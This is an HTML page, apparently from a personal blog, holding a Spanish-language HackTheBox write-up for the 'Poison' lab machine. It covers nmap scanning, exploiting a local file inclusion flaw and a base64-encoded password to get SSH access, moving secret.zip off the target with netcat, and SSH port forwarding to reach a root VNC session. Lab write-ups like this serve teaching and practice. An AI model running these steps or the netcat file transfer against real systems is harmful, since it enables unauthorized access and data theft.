@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Poison | HTB</title>
+
+    <!-- Estilos principales -->
+  <link rel="stylesheet" href="../assets/css/style.css" />
+  <!-- Fuente y resaltado de código -->
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+
+  
+</head>
+<body class="glitch-bg">
+  <nav class="navbar">
+    <ul class="nav-list">
+      <li><a href="../index.html">Inicio</a></li>
+      <li><a href="../projects.html">Proyectos</a></li>
+      <li><a href="../blog.html">Blog</a></li>
+      <li><a href="../notes.html">Notas</a></li>
+      <li><a href="../writeups.html">Writeups</a></li>
+      <li><a href="../about.html">Sobre mí</a></li>
+      <li><a href="../contact.html">Contacto</a></li>
+    </ul>
+  </nav>
+
+  <main class="blog-container">
+    <section class="blog-post">
+      <div class="terminal-box">
+        <a href="../writeups.html">← Volver a Writeups</a>
+        <h1>Poison</h1>
+
+        
+        <div class="img-placeholder">
+          <img src="../assets/img/writeups/poison/poison_banner.png" alt="poison - placeholder">
+        </div>
+        <br>
+
+        <article>
+
+          <!-- === PRIMERA SECCIÓN: Reconocimiento === -->
+          <section id="Reconoccimiento">
+            <h2>Fase de reconocimiento</h2>
+            <br>  
+            <p>Primero procedo a hacer un análisis de puertos con nmap hacia el servidor:</p>
+             <br>
+            <pre><code class="bash">nmap -sS -p- --open 10.129.1.254 -Pn -oG Ports</code></pre>
+            <br>
+            <ul>
+                <li><strong style="color: aquamarine;">-sS:</strong> Especifico el uso de un escaneo SYN (half-open)</li>
+                <li><strong style="color: aquamarine;">-p-:</strong> Indico que quiero escanear todo el rango de puertos</li>
+                <li><strong style="color: aquamarine;">--open:</strong> Esto me filtra solo por los puertos abiertos</li>
+                <li><strong style="color: aquamarine;">-Pn:</strong> Esto hace que no haga ping por lo que acelera el escaneo</li>
+                <li><strong style="color: aquamarine;">-oG Ports:</strong> Guarda el resultado del escaneo en un archivo llamado Ports, y de esta forma se pueden  filtrar los datos del resultado  en caso de que haya  una gran cantidad de puertos disponibles</li>
+            </ul>
+            <br>
+             <div class="img-placeholder">
+              <img src="../assets/img/writeups/poison/poison_nmap1.png" alt="Poison - Nmap puertos">
+             </div>
+             <br>
+           <p>El resultado del escaneo muestra que solo el puerto 22 (SSH) y el puerto 80 (HTTP) están abiertos</p>
+           <p>Ahora con esta información procedemos a realizar un análisis más detallado del servicio HTTP y SSH</p>
+           <br>
+           <pre><code class="bash">nmap -sCV -p 22,80 10.129.1.254 -oN Versions</code></pre>
+              <br>
+              <ul>
+                <li><strong style="color: aquamarine;">-sCV:</strong> Especifico que quiero hacer un escaneo de scripts básicos de Nmap (C) y de versiones (V)</li>
+                <li><strong style="color: aquamarine;">-p 80,22:</strong> Indico que quiero escanear solo los puertos 80 y 22</li>
+                <li><strong style="color: aquamarine;">-oN Versions:</strong> Guarda el resultado del escaneo en un archivo llamado Versions, y de esta forma se puede revisar el resultado posteriormente</li>
+            </ul>
+              <div class="img-placeholder">
+                <img src="../assets/img/writeups/poison/poison_nmap2.png" alt="Poison - Nmap versiones">
+              </div>
+            <br>
+            <h2>Reconocimiento de la Página Web (Puerto 80)</h2>
+            <p>Antes de ingresar a la página web, reviso con Curl su código fuente y las cabeceras para analizar las tecnologías en uso y si hay comentarios sensibles expuestos</p>
+            <p>En el análisis se puede ver que la página parece ser un lugar de pruebas para scripts internos de php:</p>
+            <br>
+            <pre><code class="bash">curl 10.129.1.254
+curl 10.129.1.254 --head</code></pre>
+            <br>
+            <div class="img-placeholder">
+            <img src="../assets/img/writeups/poison/poison_curl.png" alt="Poison - Curl">
+            </div>
+            <br>
+            <p>Al ingresar a la página web, se puede observar una  especie de buscador el cual nosss permite interactuar con los diversos archivos disponibles:</p>
+            <ul>
+                <li>ini.php</li>
+                <li>info.php</li>
+                <li>listfiles.php</li>
+                <li>phpinfo.php</li>
+            </ul>
+            <br>
+            <p>Si ingresamos a <strong style="color: aqua;">info.php</strong> podemos ver que hay versiones del sistema que se encuentra en uso</p>
+            <div class="img-placeholder">
+                <img src="../assets/img/writeups/poison/poison_info.png" alt="Poison - info.php">
+            </div>
+            <br>
+            <p>Cuando ingresamos a <strong style="color: aqua;">listfiles.php</strong> podemos ver una lista de los archivos adicionales disponibles en el servidor, y el que más destaca es <strong style="color: aqua;">pwdbackup.txt</strong></p>
+            <div class="img-placeholder">
+                <img src="../assets/img/writeups/poison/poison_listfiles.png" alt="Poison - listfiles.php">
+            </div>
+            <br>
+            <p>Dentro del archivo se puede reconocer un texto el cual parece estar en base64:</p>
+            <div class="img-placeholder">
+                <img src="../assets/img/writeups/poison/poison_pwdbackup.png" alt="Poison - pwdbackup.txt">
+            </div>
+            <br>
+            <p>Al seguir las instruciones parece ser que se ha hecho uso de base64 13 veces,  por lo que en este caso (lo cual no pudo haber sido lo más práctico) he  hecho uso de CyberChef para conseguir el texto</p>
+            <div  class="img-placeholder">
+                <img src="../assets/img/writeups/poison/poison_cyberchef.png" alt="Poison - CyberChef">
+            </div>
+             <br>
+             <p>Una vez viendo el resultado parece ser una contraseña por lo que he procedido a intentar probarla con el usuario root del servidor ya que es el único usuario que podría confirmar que existe dentro del servicio</p>
+             <p>Como se puede observar, tuvimos un error de autenticación, por lo que debemos de seguir enumerando el sistema para poder conseguir accceso al servidor</p>
+             <div class="img-placeholder">
+                <img src="../assets/img/writeups/poison/poison_ssh1.png" alt="Poison - SSH error">
+                </div>
+            <br>
+            <p>Tras analizar de una manera más detenida la URL sobre como se procesaban los datos, he notado que la URL dice <strong style="color:aqua;">"file="</strong></p> 
+             <div class="img-placeholder">
+                <img src="../assets/img/writeups/poison/poison_lfi.png" alt="Poison - LFI">
+            </div>
+            <br>
+            <p>En experiencias pasadas he visto que esto se puede explotar con Local File Inclusion (LFI), por lo que he decidico hacer la prueba enumerando el <strong style="color:aqua;">/etc/hosts</strong></p>
+            <div class="img-placeholder">
+                <img src="../assets/img/writeups/poison/poison_lfi2.png" alt="Poison - LFI hosts">
+            </div>
+            <div class="img-placeholder">
+                <img src="../assets/img/writeups/poison/poison_lfi3.png" alt="Poison - LFI hosts 2">
+            </div>
+            <br>
+            <p>Al listar el contenido del archivo, nos permite enumerar usuarios válidos dentro del sistema, y el que más destaca es el usuario <strong style="color:aqua;">charix</strong></p>
+            <p>Una vez tenemos un usario confirmado y una posible contraseña, Nuevamente vuelvo a intentar conectarme por ssh</p>
+            <div class="img-placeholder">
+                <img src="../assets/img/writeups/poison/poison_ssh2.png" alt="Poison - SSH charix">
+            </div>
+             <br>
+          </section>
+          <section id="Escalación de privilegios">
+            <h2>Escalación de Privilegios</h2>
+            <br>
+            <p>Una vez dentro de la máquina podemos encontrar la user flag y además un archivo llamado secret.zip</p>
+            <div class="img-placeholder">
+                <img src="../assets/img/writeups/poison/poison_userflag.png" alt="Poison - User flag">
+                </div>
+            <br>
+            <p>Con respecto al archivo secret.zip, podemos suponer que contiene información sensible que nos permitirá realizar la escalada de privilegios.</p>
+            <p>Pero al intentar descomprimirlo, nos damos cuenta de que requiere una contraseña y a la hora de hacer uso de la misma contraseña ya capturada tenemos problemas ya que el parentesis hace que la contraseña se procese como código y no como texto</p>
+            <p>Para solucionar este problema he decido usar 7z, pero este no se encuentra disponible dentro de la máquina, por lo que decidido por medio de nc mover el zip a mi máquina</p>
+            <pre><code class="bash">nc -lvnp 4444 > secret.zip --> en la máquina local
+nc -w 3 <Nuestra IP> 4444 < secret.zip --> en la máquina víctima</secret.zip></code></pre>
+            <p>He hecho uso del parámetro <strong style="color: aqua;">-w 3</strong> para hacer que la conexión se termine de manera automática 3 segundos despues de que la actividad se haya detenido</p>
+            <p>Esto permite saber cuando los datos se han finalizado de transferir</p>
+            <div class="img-placeholder">
+                <img src="../assets/img/writeups/poison/poison_nc.png" alt="Poison - Netcat">
+            </div>
+            <br>
+            <p>Una vez tenemos el archivo en nuestra máquina, procedemos a descomprimirlo con 7z usando la contraseña que habíamos encontrado</p>
+            <div class="img-placeholder">
+                <img src="../assets/img/writeups/poison/poison_7z.png" alt="Poison - 7z">
+            </div>
+            <br>
+            <p>Al descomprimir el archivo, se observa que es otro tipo ded contraseña o mecanismo de acceso a una herramienta la cual aun no se ha identificado</p>
+            <p>Al buscar procesos corriendo dentro del sistema, podemos ver que hay un proceso de xvnc el cual está corriendo dentro, pero no nos dice en que puerto corre</p>
+            <p>VNC es un protocolo de escritorio remoto, por lo que es posible que el archivo descomprimido sea la contraseña para acceder a este servicio</p>
+            <div class="img-placeholder">
+                <img src="../assets/img/writeups/poison/poison_vnc.png" alt="Poison - VNC">
+            </div>
+            <br>
+            <p>Haciendo uso de sockat podemos ver los puertos que están abiertos dentro del sistema, que servicios corren y bajo cuales usarios</p>
+            <p>Así que sabiendo esto, podemos observar que el usuario root en el puerto 5901 y 5801 de manera interna está corriendo un servicio de Xvnc</p>
+            <div class="img-placeholder">
+                <img src="../assets/img/writeups/poison/poison_sockat.png" alt="Poison - Sockat">
+            </div>
+            <br>
+            <p>Una vez confirmamos la información, procedemos a hacer port forwarding para exponer ese servicio interno a nuestra máquina</p>
+            <pre><code class="bash">ssh -L 5901:127.0.0.1:5901 charix@10.129.1.254</code></pre>
+            <p>Esto hace que el puerto 5901 de nuestra máquina se redirija al puerto 5901 del servidor, lo cual nos permite acceder al servicio de Xvnc de manera local</p>
+            <div class="img-placeholder">
+                <img src="../assets/img/writeups/poison/poison_portforwarding.png" alt="Poison - Port forwarding">
+            </div>
+            <br>
+            <p>Una vez tenemos el servicio expuesto, procedemos a usar un cliente de VNC para conectarnos al servicio y así obtener acceso a la máquina como root</p>
+            <pre><code class="bash">vncviewer 127.0.0.1:5901 -p secret</code></pre>
+            <div class="img-placeholder">
+                <img src="../assets/img/writeups/poison/poison_vncviewer.png" alt="Poison - VNC viewer">
+            </div>
+            <br>
+            <p>Una vez dentro del servicio, podemos obtener la root flag y así finalizar el reto. Espero les haya servido la guía</p>
+            </section>
+            <footer class="post-footer">
+  <span class="post-date"><time datetime="2026-03-11">2026-03-11</time></span>
+  <div class="post-social">
+    <p>[ contact ]</p>
+    <a href="https://www.twitch.tv/kallrize" target="_blank">twitch</a>
+    <a href="https://www.youtube.com/@kallrizeklr5364" target="_blank">Youtube</a>
+    <a href="https://www.linkedin.com/in/gabrielp%C3%A9rez-959645213" target="_blank">linkedin</a>
+  </div>
+</footer>
+        </article>
+      </div>
+    </section>
+  </main>
+</body>
+</html>
